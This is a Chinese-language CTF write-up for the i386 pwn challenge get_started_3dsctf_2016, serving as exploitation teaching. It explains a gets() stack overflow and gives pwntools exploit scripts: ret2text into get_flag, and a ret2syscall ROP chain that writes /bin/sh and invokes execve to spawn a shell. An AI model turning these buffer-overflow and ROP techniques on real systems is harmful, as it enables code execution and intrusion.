# 知识点

栈

# 题目分析

分类：pwn / 栈。

本页按现有附件、脚本和分析记录归档；运行与解题状态见具体记录，整理过程未执行题目或远端脚本。

## 文件

- [get_started_3dsctf_2016](get_started_3dsctf_2016)
- [get_started_3dsctf_2016.py](get_started_3dsctf_2016.py)

## 已有分析

- [get_started_3dsctf_2016_WP_学习版.md](notes/get_started_3dsctf_2016_WP_%E5%AD%A6%E4%B9%A0%E7%89%88.md)


### get_started_3dsctf_2016：从 `gets` 到 ret2text，再到 ret2syscall

> [!important] 先说清这篇的状态
> 这篇把公开 WP 和你提供的汇编、EXP 解释成一条学习路线。当前没有这道题的 ELF 和本地 GDB 输出，因此地址、56 字节 offset、gadget、可写地址都是**样本候选值**，脚本标记为 `STATIC_ONLY`。不能把它们当成已经在你的附件上跑通。

#### 这题要学什么

最短解法是覆盖返回地址，让程序跳到已有的 `get_flag()`，按 32 位调用约定摆好参数。这个练法叫 **ret2text**。

你提供的复杂脚本则是另一条路线：先让 ROP gadget 把 `/bin/sh\0` 写进可写内存，再准备 Linux i386 系统调用参数，最后执行 `int 0x80`。这叫 **ret2syscall**。它适合练 gadget、寄存器、内存写入和 syscall；不是本题必须走的解法。

```text
同一个栈溢出
   ├─ 简单路线：saved EIP → get_flag(参数1, 参数2) → exit
   └─ 进阶路线：saved EIP → pop/mov gadgets → 写 /bin/sh → execve
```

#### 1. 怎么看出这是栈溢出？

不要只看题名或 `checksec`。要沿着“输入写到哪里、有没有长度限制、函数怎么返回”这条线检查。

公开样本的 `main` 大意如下：

```c
int main(void) {
    char buf[56];
    printf("Qual a palavrinha magica? ");
    gets(buf);
    return 0;
}
```

关键是 `gets(buf)`：`gets` 不接收缓冲区容量，只读到换行或 EOF。`buf` 位于 `main` 的栈帧，输入超过它到保存返回地址之间的空间时，就可能覆盖 saved EIP。

```text
低地址                                            高地址
┌──────────────────────┬──────────────┬────────────┐
│ buf 与栈帧空间        │ saved EBP    │ saved EIP  │
└──────────────────────┴──────────────┴────────────┘
  gets 从这里开始写  ───────────────────────────→
```

**判断证据：** IDA 里确认 `gets` 的实参指向栈上的局部缓冲区；再在 GDB 的函数 `ret` 前确认栈顶已被输入覆盖。`gets` 是危险线索，GDB 中 `ret` 前的值才证明 saved EIP 是否可控。

#### 2. 为什么 offset 是 56？

样本反汇编的核心关系是：

```asm
sub esp, 0x3c
lea eax, [esp+0x3c-0x38]   ; IDA 的 var_38 = -0x38，所以地址是 esp+4
mov [esp], eax
call gets
...
add esp, 0x3c
ret
```

设执行 `lea` 时的 `ESP` 为 `S`：

```text
输入起点       = S + 4
saved EIP 位置 = S + 0x3c   （add esp,0x3c 后，ret 从这里取地址）
距离           = (S+0x3c) - (S+4)
               = 0x38 = 56 字节
```

因此样本候选 payload 的前 56 字节填到 saved EIP 前面；第 57 个输入字节开始覆盖返回地址。

```text
b'A' * 56       → 填充到返回地址槽之前
p32(target)     → 覆盖 saved EIP（32 位地址，小端序）
```

这只是从给出的反汇编推出来的候选值。实际附件要用 i386 cyclic（生成和查询采用同一 `n`，通常 `n=4`）与 GDB ret 前栈内容再确认。

#### 3. 先做最短路线：ret2text 调用 `get_flag`

程序自带 `get_flag()`，它会检查两个参数，满足条件后读取并输出 `flag.txt`。公开样本需要的参数值为：

```text
arg1 = 814536271 = 0x308cd64f
arg2 = 425138641 = 0x195719d1
```

##### 为什么 payload 顺序是这样？

i386 常见 cdecl 调用在函数入口的栈布局是：

```text
ESP+0x00  返回地址
ESP+0x04  第一个参数
ESP+0x08  第二个参数
```

我们用被溢出的 `ret` 直接跳进 `get_flag`，所以手工摆成：

```text
低地址 / ret 先读
┌────────────────────────┐
│ 56 字节填充            │
├────────────────────────┤
│ get_flag 地址           │ ← main 的 ret 跳到这里
├────────────────────────┤
│ exit 地址               │ ← get_flag 返回后去这里
├────────────────────────┤
│ arg1                    │
├────────────────────────┤
│ arg2                    │
└────────────────────────┘
高地址
```

`exit` 不是 `get_flag` 的参数。它占据的是 `get_flag` 入口处的返回地址位置。`get_flag` 执行完 `ret` 后，CPU 才会跳到 `exit`。正常结束也能让标准输出缓冲区有机会刷新；是否需要这一步，要结合目标程序和远程服务观察，不能把“没收到输出”一概归因于缓冲。

##### ret2text 样本脚本

```python
from pwn import *

context.arch = 'i386'
context.os = 'linux'

BIN = './get_started_3dsctf_2016'
OFFSET = 56              # 样本值：先用当前 ELF + cyclic/GDB 复核
GET_FLAG = 0x080489a0    # 样本候选地址：反汇编确认函数入口
EXIT = 0x0804e6a0        # 样本候选地址：确认是可用的 exit 路径

io = process(BIN)
payload = flat(
    b'A' * OFFSET,
    GET_FLAG,
    EXIT,
    0x308cd64f,
    0x195719d1,
)
io.sendline(payload)
io.interactive()
```

如果本地目录没有 `flag.txt`，可放一个无害的本地测试文件；不能因此把本地输出当成远程平台的 flag 证明。地址在不同附件中可能不同，公开 WP 也出现过 `get_flag` 函数内不同位置的地址；应查当前 ELF 符号/反汇编，不能把不同版本的地址拼在一起。

#### 4. 什么时候才用 ret2syscall？

当题目没有合适的后门函数、没有方便的 libc 调用路径，而你又能找到设参 gadget 和 syscall 入口时，可以考虑 ret2syscall。本题已经有能读 flag 的 `get_flag()`，所以 ret2syscall 是额外练习路线。

##### 先弄懂四类指令

###### `pop eax`

`pop eax` 把 `[ESP]` 的 4 字节放进 EAX，再把 ESP 增加 4。紧接的 `ret` 再从新的 `[ESP]` 取下一跳地址。

```text
栈顶数据 → EAX
下一格   → EIP（由 ret 取走）
```

###### `pop edx; pop ecx; pop ebx; ret`

它连续取三个 4 字节值，严格按指令次序装入寄存器：

```text
栈上：[给 EDX 的值] [给 ECX 的值] [给 EBX 的值] [下一 gadget]
```

所以链上的数据顺序不是随意的。最后一个 `ret` 消耗的栈槽就是下一条指令地址。

###### `mov dword ptr [edx], eax`

这是写**内存**，不是寄存器间复制：把 EAX 的 4 个字节写到 EDX 保存的地址处。

```text
EDX = 0x080eb050
EAX = 0x6e69622f
执行 mov [edx], eax
内存 0x080eb050 起变成 2f 62 69 6e，即字符串 "/bin"
```

方括号 `[edx]` 的意思是“EDX 里放着一个地址，去那个地址读/写内存”。`dword` 是 4 字节。x86 是小端序，因此整数 `0x6e69622f` 在内存里的字节从低地址到高地址为 `2f 62 69 6e`。

###### `int 0x80`

它让 32 位 Linux 内核按寄存器值处理一次系统调用。它自己不会自动变成 shell：

```text
EAX = 系统调用号
EBX = 参数 1
ECX = 参数 2
EDX = 参数 3
int 0x80 = 请求内核执行
```

本题选择 `execve`：i386 调用号是 11，`EBX` 指向文件名，`ECX` 是 argv 指针，`EDX` 是 envp 指针。Linux 接受 `argv=NULL` / `envp=NULL` 属于兼容行为；通用写法应准备 NULL 结尾的指针数组。成功执行 `execve` 后，进程映像被 shell 替换，通常不会返回。

##### 为什么不把 `/bin/sh` 直接留在 payload 里？

**不是绝对不能。** 如果能可靠知道栈上那串字节的运行地址，并且该地址可读，那么可以让 EBX 指向栈上的字符串。但本题的栈地址可能受 ASLR 影响，而且“字符串在 payload 里”不等于“EBX 自动知道它的地址”。

这个样本改用固定程序映像中的可写区：先确认目标映射可写，再用已有 `mov [edx],eax` gadget 将字符串写进去。公开样本的 pwndbg `vmmap` 显示 `0x080ea000–0x080ec000` 为 `rw-p`，`0x080eb050` 落在其中；你的附件必须重新查 `vmmap`，确认从目标地址开始的 8 字节都可写且不会破坏程序还要使用的数据。

```text
输入里的 4 字节数据 /bin
        │ pop eax
        ▼
EAX = 0x6e69622f
EDX = 0x080eb050
        │ mov dword ptr [edx], eax
        ▼
可写内存 0x080eb050 = "/bin"

第二次写入目标改为 0x080eb050 + 4
        ▼
同一片内存变成 "/bin/sh\0"
```

所以 `bin_sh + 4` 来自每次写 4 字节：第一笔占 `[bin_sh, bin_sh+3]`，第二笔从 `bin_sh+4` 接着写。

##### ret2syscall 样本脚本

```python
from pwn import *

context.arch = 'i386'
context.os = 'linux'

BIN = './get_started_3dsctf_2016'
OFFSET = 56                 # 样本候选值：cyclic + GDB 复核
POP_EAX = 0x080b91e6        # pop eax; ret
POP_EDX_ECX_EBX = 0x0806fc30  # pop edx; pop ecx; pop ebx; ret
MOV_EDX_EAX = 0x080557ab    # mov dword ptr [edx], eax; ret
INT_80 = 0x0806d7e5         # int 0x80
BINSH = 0x080eb050          # 样本候选值：vmmap 复核可写

io = process(BIN)
payload = b'A' * OFFSET

### 先把 8 字节字符串分两次写到可写内存
payload += flat(POP_EAX) + b'/bin'
payload += flat(POP_EDX_ECX_EBX, BINSH, 0, 0, MOV_EDX_EAX)
payload += flat(POP_EAX) + b'/sh\x00'
payload += flat(POP_EDX_ECX_EBX, BINSH + 4, 0, 0, MOV_EDX_EAX)

### 再准备 execve("/bin/sh", NULL, NULL)
payload += flat(POP_EAX, 11)
payload += flat(POP_EDX_ECX_EBX, 0, 0, BINSH, INT_80)

io.sendline(payload)   # gets 按行读取；先确认地址编码里没有 0x0a
io.interactive()
```

在 pwntools 里 `flat(POP_EAX)` 会按当前 i386 架构打包地址；`b'/bin'` 是原样 4 个字节，`flat` 不会自动把它变成代码。`gets` 以换行结束输入，所以要检查每个地址的小端字节中有没有 `0x0a`；NUL 字节可以作为输入数据读入，但之后若被 C 字符串函数处理，就会作为字符串结束符。这个脚本中的 gadget 和 `BINSH` 来自公开样本记录，不是通用地址。换附件后逐个反汇编核对完整指令及副作用。

#### 5. 把 ROP 栈槽手推一遍

第一段：`pop eax; ret`。

```text
saved EIP = POP_EAX
ESP → 2f 62 69 6e         → pop eax，EAX 变成 "/bin" 的数值
ESP → POP_EDX_ECX_EBX     → ret 跳到三寄存器 gadget
```

第二段：三寄存器 gadget。

```text
ESP → BINSH       → EDX = BINSH
ESP → 0           → ECX = 0
ESP → 0           → EBX = 0
ESP → MOV_EDX_EAX → ret 跳到写内存 gadget
```

第三段：`mov [edx], eax; ret` 将 EAX 的 4 字节写到 `[EDX]`，然后 ret 取下一个 gadget。执行两轮后内存里才真正有 `/bin/sh\0`。

最后一段进入 `int 0x80` 前应看到：

```text
EAX = 11
EBX = BINSH     → "/bin/sh\0"
ECX = 0         → argv=NULL（Linux 兼容用法）
EDX = 0         → envp=NULL（Linux 兼容用法）
```

**为什么改寄存器就能利用？** 因为 CPU 执行 gadget 时会把寄存器当作指令输入：`pop` 从栈取数写寄存器，`mov [edx],eax` 用寄存器中的地址和值写内存，`int 0x80` 再按寄存器约定请求内核服务。寄存器不是“权限开关”；值必须正确、地址必须有效、syscall 也必须成功。

#### 6. GDB 验证顺序

先在当前 ELF 上确定真实地址，不要直接复制本页常量。

```gdb
### 在 main 的 gets 调用后、函数 ret 前设置断点
break *<gets返回后的地址>
break *<main真实ret地址>
run
```

`gets` 返回后看输入和栈顶：

```gdb
x/16bx <缓冲区地址>
x/8wx $esp
```

在 `main` 的 `ret` 前：

```gdb
x/i $eip
x/wx $esp
```

此时 `[ESP]` 应是你 payload 里的第一个目标地址。单步执行 `ret`：

```gdb
si
info registers eip esp
```

`EIP` 应到预期 gadget。对 `ret2syscall` 再分段停下：

```gdb
### 在每个 gadget 起点断下后，按指令单步
info registers eax ebx ecx edx esp eip
x/8wx $esp
x/8bx 0x080eb050
```

在 `mov [edx],eax` 执行前确认 `EDX` 是可写地址、`EAX` 是预期 4 字节；执行后用 `x/8bx BINSH` 确认内存。到 `int 0x80` 前，确认 `EAX=11`、`EBX=BINSH`，再看 `x/s $ebx`。

查询目标是否可写：pwndbg 用 `vmmap`；原生 GDB 可用 `info proc mappings`。`readelf -lW` 能看静态 LOAD 段权限，但不能替代正在运行进程的映射证据。

#### 7. 常见卡点

| 现象 / 疑问 | 应该怎么判断 |
|---|---|
| 看见 `gets`，是否就能确定控 EIP？ | 不能。确认目的地址在栈上、输入长度可越过 saved EIP，并在真实 `ret` 前查看 `[ESP]`。 |
| 为什么不是直接 ret 到 shellcode？ | 本题 NX 开启，栈上数据不能默认执行；ret2text/ret2syscall 重用已有代码。 |
| gadget 地址对，但链跑偏 | 核对每条 `pop` 的顺序和数量；每次 `pop` 在 i386 吃 4 字节，`ret` 也吃 4 字节。 |
| `/bin/sh` 明明在 payload 里，`execve` 仍失败 | 检查 EBX 是否指向那串字节；还要确认内存可读、NUL 结尾、`EAX=11`。 |
| `BINSH` 地址怎么选？ | 从当前运行的 `vmmap` / `info proc mappings` 选足够大的 `rw-p` 区域，并确认整个写入范围有效。 |
| 脚本本地能开 shell但没有 flag | shell 本身不等于 flag；要确认工作目录/题目运行环境，再通过交互或题目规定的输出读取。 |
| 远程没有回显 | 先检查程序是否正常走到输出和退出路径，再看缓冲、协议与服务行为；不要只凭一个现象认定原因。 |

#### 8. 复盘结论

```text
gets(栈上 buf，无长度限制)
    ↓ 输入越过 saved EIP
ret 从 [ESP] 取出攻击者安排的下一地址
    ↓
ret2text：跳到已有 get_flag，按 cdecl 摆返回地址和参数
    或
ret2syscall：pop 设置寄存器 → mov 写出字符串 → int 0x80 请求 execve
```

这题真正要会推的是四件事：`56` 来自输入地址到 saved EIP 的距离；combo gadget 的栈顺序来自 `pop` 指令顺序；`BINSH+4` 来自每次写 4 字节；syscall 参数来自 i386 Linux ABI。地址和 offset 都要回到自己的附件验证。

#### 参考资料

- [zzkkk1h：BUUCTF get_started_3dsctf_2016](https://www.cnblogs.com/zzkkk1h/p/18178812)：同时列了 `get_flag` ret2text 与 `int 0x80` ret2syscall 路线；重点对照 offset、参数、gadget 和可写区。
- [CSULuyao：常规 get_flag 与 mprotect 路线](https://www.cnblogs.com/csuchenzc/p/14375662.html)：对比简单后门调用与更长的 mprotect + shellcode 路线；可用来理解为什么先选最短路线。
- [h-t-m：BUUCTF PWN 刷题笔记](https://h-t-m.top/posts/9e217072/)：页面内搜索 `get_started_3dsctf_2016`，查看文件画像、`gets` 伪代码和 `get_flag` 参数分析。
- [Linux gets(3p)](https://man7.org/linux/man-pages/man3/gets.3p.html)：核对 `gets` 的输入边界和不安全原因。
- [Linux syscall(2)](https://www.man7.org/linux/man-pages/man2/syscall.2.html) · [Linux execve(2)](https://www.man7.org/linux/man-pages/man2/execve.2.html)：核对架构调用约定、`argv/envp` 与 `execve` 行为。

相关知识：`栈溢出详解` · `偏移量` · `ret2text` · `ROP链构造` · `ret2syscall` · `ROPgadget详解` · `函数调用与栈帧`。


# EXP

- [get_started_3dsctf_2016.py](get_started_3dsctf_2016.py)

脚本按已有材料保留，使用前核对目标程序、运行库和参数。公开副本中的历史服务地址已替换，需自行设置。

```python
from pwn import *
context(arch = 'i386', os = 'linux', log_level = 'debug')
io = process('./get_started_3dsctf_2016')
#io=remote("challenge.example.invalid", 9999, ssl=True, sni="challenge.example.invalid")
get_flag = 0x080489A0
payload = b'A'*56+p32(get_flag)+p32(0x804e6a0)+p32(814536271)+p32(0x195719D1)
io.sendline(payload)
io.interactive()
```
